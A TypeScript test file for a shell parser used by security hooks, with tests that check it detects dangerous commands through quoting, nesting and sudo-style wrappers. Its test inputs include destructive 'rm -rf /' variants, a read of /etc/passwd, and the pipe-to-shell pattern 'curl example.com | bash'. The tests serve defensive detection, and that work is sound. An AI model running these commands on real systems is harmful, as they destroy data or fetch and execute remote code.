// Security-relevant correctness regressions (audit phase 5).
//
// These tests exercise the contract from the consumer's perspective:
// security hooks call parse() + findCalls() + unwrapCall() + resolveFlags()
// to detect dangerous patterns. A test here failing means a hook
// silently misses a real-world bypass.

import { describe, expect, test } from "bun:test";
import { DYNAMIC, findCalls, parse } from "../src/index.js";
import { unwrapCall } from "../src/semantic.js";
import { testCmd } from "./_assertions.js";

describe("quoted flags must canonicalize the same as bare flags", () => {
  // Bash strips quotes before passing args to the command. A hook that
  // checks for `flags.includes("-r")` must see `-r` whether the user
  // wrote rm -rf, rm "-rf", or rm '-rf'. Otherwise: silent bypass.
  testCmd('rm "-rf" /', { cmd: "rm", flags: ["-r", "-f"], args: ["/"] });
  testCmd("rm '-rf' /", { cmd: "rm", flags: ["-r", "-f"], args: ["/"] });
  testCmd('rm "-r" "-f" /', { cmd: "rm", flags: ["-r", "-f"], args: ["/"] });
  testCmd('"rm" -rf /', { cmd: "rm", flags: ["-r", "-f"], args: ["/"] });
  // "$flags" is DblQuoted with ParamExp inside — cannot resolve statically;
  // the literal "/" is preserved as a string.
  testCmd('rm "$flags" /', { cmd: "rm", flags: [], args: [DYNAMIC, "/"] });
  // Pre-fix the literal user string "<dynamic>" would collide with the
  // sentinel; with Symbol it stays a real string in args.
  testCmd('rm "<dynamic>"', { cmd: "rm", args: ["<dynamic>"] });
});

describe("findCalls reaches commands inside every nesting form", () => {
  // walk.ts has a switch case for each container type. A regression
  // dropping any case silently breaks findCalls for that nesting form.
  testCmd("make && rm -rf / || echo done", { calls: ["make", "rm", "echo"] });
  testCmd("cat /etc/passwd | grep root | wc -l", { calls: ["cat", "grep", "wc"] });
  testCmd("(cd /tmp && rm -rf *)", { calls: ["cd", "rm"] });
  testCmd("{ echo a; rm -rf /; }", { calls: ["echo", "rm"] });
  testCmd("if true; then rm -rf /; fi", { calls: ["true", "rm"] });
  testCmd("if false; then echo; else rm -rf /; fi", { calls: ["false", "echo", "rm"] });
  testCmd("while :; do rm -rf /; done", { calls: [":", "rm"] });
  testCmd("for f in *.txt; do rm $f; done", { calls: ["rm"] });
  testCmd("case x in y) rm -rf /;; *) echo no;; esac", { calls: ["rm", "echo"] });
  testCmd("foo() { rm -rf /; }", { calls: ["rm"] });
  testCmd("echo $(rm -rf /)", { calls: ["echo", "rm"] });
  testCmd("! rm -rf /", { calls: ["rm"] });
  testCmd("rm -rf / &", { calls: ["rm"] });

  testCmd("FOO=bar rm -rf /", { cmd: "rm", calls: ["rm"], assignsCount: 1 });
});

describe("dialect parameter actually changes parser behavior", () => {
  // Without these tests, parse(..., "posix") could silently fall back
  // to bash and every assertion would still pass.

  test("posix rejects bash-only function keyword", async () => {
    await expect(parse("function foo { :; }", "posix")).rejects.toThrow();
  });

  test("posix rejects bash-only array literal", async () => {
    // mvdan/sh's posix is lenient on [[ ... ]] but does reject arrays.
    await expect(parse("a=(b c)", "posix")).rejects.toThrow();
  });

  test("posix rejects bash-only process substitution", async () => {
    await expect(parse("diff <(ls)", "posix")).rejects.toThrow();
  });

  test("bash accepts what posix rejects", async () => {
    const ast = await parse("a=(b c)", "bash");
    expect(ast.type).toBe("File");
  });

  test("mksh dialect parses mksh-specific reply variable", async () => {
    // ${|...} originated in mksh as a "reply variable" form. mvdan/sh
    // has historically accepted it under both bash and mksh dialects;
    // we assert mksh works to keep at least one mksh-targeted fixture.
    const ast = await parse("${|x=1;}", "mksh");
    expect(ast.type).toBe("File");
  });

  test("posix rejects mksh ${ stmts;} grouping", async () => {
    // ${ stmts;} (note the leading space) is mksh's value-substitution
    // grouping. posix rejects it; bash and mksh accept.
    await expect(parse("${ x=1;}", "posix")).rejects.toThrow();
  });
});

describe("splitBraces option exposes BraceExp nodes", () => {
  test("default leaves {a,b,c} as Lit (mvdan/sh default)", async () => {
    const ast = await parse("echo {a,b,c}");
    const stmt = ast.stmts[0]!;
    if (stmt.cmd?.type !== "CallExpr") throw new Error();
    const part = stmt.cmd.args[1]?.parts[0];
    expect(part?.type).toBe("Lit");
  });

  test("splitBraces: true produces BraceExp", async () => {
    const ast = await parse("echo {a,b,c}", "bash", { splitBraces: true });
    const stmt = ast.stmts[0]!;
    if (stmt.cmd?.type !== "CallExpr") throw new Error();
    const part = stmt.cmd.args[1]?.parts[0];
    expect(part?.type).toBe("BraceExp");
    if (part?.type === "BraceExp") {
      expect(part.elems).toHaveLength(3);
      expect(part.sequence).toBe(false);
    }
  });

  test("splitBraces: true on {1..5} produces sequence BraceExp", async () => {
    const ast = await parse("echo {1..5}", "bash", { splitBraces: true });
    const stmt = ast.stmts[0]!;
    if (stmt.cmd?.type !== "CallExpr") throw new Error();
    const part = stmt.cmd.args[1]?.parts[0];
    expect(part?.type).toBe("BraceExp");
    if (part?.type === "BraceExp") {
      expect(part.sequence).toBe(true);
    }
  });
});

describe("input size cap (audit B2)", () => {
  // Adversarial input could OOM the WASM instance. parse() must
  // reject inputs that exceed an explicit byte cap before crossing
  // the WASM boundary.

  test("rejects input over default 1MB cap", async () => {
    const big = `echo ${"x".repeat(1_500_000)}`;
    await expect(parse(big)).rejects.toThrow(/maxBytes/);
  });

  test("respects custom maxBytes", async () => {
    await expect(parse("echo hello world", "bash", { maxBytes: 5 })).rejects.toThrow(
      /maxBytes/
    );
  });

  test("accepts input under cap", async () => {
    const ast = await parse("echo hi", "bash", { maxBytes: 100 });
    expect(ast.type).toBe("File");
  });

  test("default 1MB allows reasonably large scripts", async () => {
    // 100 KB of legitimate script — well under 1MB
    const lines: string[] = [];
    for (let i = 0; i < 1000; i++) lines.push(`echo line${i}`);
    const ast = await parse(lines.join("\n"));
    expect(ast.type).toBe("File");
  });
});

describe("privilege escalators (audit B1, B4)", () => {
  testCmd("sudo -u root rm -rf /", { wrapper: "sudo", cmd: "rm" });
  testCmd("doas -u root rm -rf /", { wrapper: "doas", cmd: "rm" });
  testCmd("pkexec --user root rm -rf /", { wrapper: "pkexec", cmd: "rm" });
  testCmd("gosu nobody rm -rf /tmp", { wrapper: "gosu", cmd: "rm" });
  testCmd("runuser -u root rm -rf /", { wrapper: "runuser", cmd: "rm" });
  testCmd("setpriv --reuid 0 rm -rf /", { wrapper: "setpriv", cmd: "rm" });
  testCmd("sudo --user=root rm -rf /", { wrapper: "sudo", cmd: "rm" });
  // su -c / sh -c put the inner command INSIDE -c's value as a string.
  // unwrapCall returns commandString instead of cmd so the consumer
  // can parse() it themselves.
  testCmd(`su user -c "rm -rf /"`, {
    wrapper: "su",
    cmd: null,
    commandString: "rm -rf /",
  });
  testCmd(`sh -c "rm -rf /"`, { wrapper: "sh", cmd: null, commandString: "rm -rf /" });
});

describe("resolveFlags canonicalization edge cases (agent bug-hunt)", () => {
  // #10/11 — short-flag fabrication. Pre-fix, `-=value` exploded into
  // `["-=","-v","-a","-l","-u","-e"]`. Combined-short expansion must
  // only apply to pure-letter runs.
  testCmd("cmd -=value", { cmd: "cmd", flags: ["-=value"], args: [] });
  testCmd("cmd -ab=c", { cmd: "cmd", flags: ["-ab=c"], args: [] });
  testCmd("gcc -O2 foo.c", { cmd: "gcc", flags: ["-O2"], args: ["foo.c"] });
  // Letter-only stays expanded (regression check)
  testCmd("rm -rf /", { cmd: "rm", flags: ["-r", "-f"], args: ["/"] });

  // #13 — empty DblQuoted is "", not unresolvable
  testCmd('echo ""', { cmd: "echo", args: [""] });
  testCmd("echo ''", { cmd: "echo", args: [""] });
  testCmd('echo "" "y"', { cmd: "echo", args: ["", "y"] });

  // #16 — second `--` is positional (end-of-flags already toggled)
  testCmd("rm -- --", { cmd: "rm", flags: [], args: ["--"] });
  testCmd("rm -- -a -b", { cmd: "rm", flags: [], args: ["-a", "-b"] });

  // #18 — bare `-` is the POSIX stdin sentinel (positional, not a flag)
  testCmd("cat -", { cmd: "cat", flags: [], args: ["-"] });
  testCmd("cat - file", { cmd: "cat", flags: [], args: ["-", "file"] });
  testCmd("diff a -", { cmd: "diff", flags: [], args: ["a", "-"] });
});

describe("parse() input preprocessing", () => {
  // #29 — UTF-8 BOM stripped so first command name parses cleanly
  test("UTF-8 BOM stripped from leading source", async () => {
    const ast = await parse("﻿echo hello");
    const stmt = ast.stmts[0]!;
    if (stmt.cmd?.type !== "CallExpr") throw new Error();
    const cmdLit = stmt.cmd.args[0]?.parts[0];
    expect(cmdLit?.type).toBe("Lit");
    if (cmdLit?.type === "Lit") expect(cmdLit.value).toBe("echo");
  });

  test("BOM-less source unaffected", async () => {
    const ast = await parse("echo hello");
    expect(ast.stmts).toHaveLength(1);
  });
});

describe("wrapper edge cases — bug-hunt findings", () => {
  // BUG-A — commandFlag with no value: wrapper preserved, no commandString
  testCmd("bash -c", { wrapper: "bash", cmd: null, flags: ["-c"] });
  testCmd("sh -c", { wrapper: "sh", cmd: null, flags: ["-c"] });
  testCmd("su user -c", { wrapper: "su", cmd: null, flags: ["-c"] });

  // BUG-B — dynamic inner cmd: wrapper preserved
  test("sudo $cmd — wrapper:sudo preserved when inner is dynamic", async () => {
    const ast = await parse("sudo $cmd");
    const u = unwrapCall(findCalls(ast)[0]!);
    expect(u?.wrapper).toBe("sudo");
    expect(u?.cmd).toBeNull();
    expect(u?.args).toContain(DYNAMIC);
  });

  test("sudo -u root $cmd — wrapper:sudo preserved even after consumed -u root", async () => {
    const ast = await parse("sudo -u root $cmd");
    const u = unwrapCall(findCalls(ast)[0]!);
    expect(u?.wrapper).toBe("sudo");
    expect(u?.cmd).toBeNull();
  });

  // #20 — long-form flag with space value works for sudo
  testCmd("sudo --user root rm -rf /tmp", { wrapper: "sudo", cmd: "rm" });
  testCmd("sudo --user=root rm -rf /tmp", { wrapper: "sudo", cmd: "rm" });
  testCmd("sudo --host myhost rm /", { wrapper: "sudo", cmd: "rm" });

  // #35 — bash -c "script" trailing-args go to args; commandString is the script ONLY
  test(`bash -c "rm" extra — commandString="rm", args=["extra"]`, async () => {
    const ast = await parse(`bash -c "rm" extra`);
    const u = unwrapCall(findCalls(ast)[0]!);
    expect(u?.commandString).toBe("rm");
    expect(u?.args).toEqual(["extra"]);
  });
});

describe("wrapper-named commands invoked without an inner cmd (gh #7)", () => {
  // Every shell wrapper has a non-wrapping invocation form. When it
  // appears that way, unwrapCall must surface it as a normal call
  // (wrapper:null, cmd:"bash") — not as null, which would hide it
  // from every consumer rule.

  testCmd("bash", { wrapper: null, cmd: "bash" });
  testCmd("bash --version", { wrapper: null, cmd: "bash", flags: ["--version"] });
  testCmd("bash -i", { wrapper: null, cmd: "bash", flags: ["-i"] });
  testCmd("sh", { wrapper: null, cmd: "sh" });
  testCmd("zsh -l", { wrapper: null, cmd: "zsh", flags: ["-l"] });
  testCmd("sudo", { wrapper: null, cmd: "sudo" });
  testCmd("sudo -V", { wrapper: null, cmd: "sudo", flags: ["-V"] });
  testCmd("sudo -u root", { wrapper: null, cmd: "sudo" }); // -u consumed root; no inner cmd
  testCmd("gosu user", { wrapper: null, cmd: "gosu" }); // positionalUser consumed
  testCmd("su nobody", { wrapper: null, cmd: "su" });
  testCmd("pkexec", { wrapper: null, cmd: "pkexec" });

  // The canonical RCE pattern — bash on the right side of a pipe with no inner
  // command. Both stages must be visible to findCalls AND unwrapCall.
  test("curl example.com | bash — both stages surface as cmd-resolvable", async () => {
    const { parse, findCalls } = await import("../src/index.js");
    const { unwrapCall } = await import("../src/semantic.js");
    const ast = await parse("curl example.com | bash");
    const calls = findCalls(ast);
    expect(calls).toHaveLength(2);
    const left = unwrapCall(calls[0]!);
    const right = unwrapCall(calls[1]!);
    expect(left?.cmd).toBe("curl");
    expect(right?.cmd).toBe("bash");
    expect(right?.wrapper).toBeNull();
  });
});
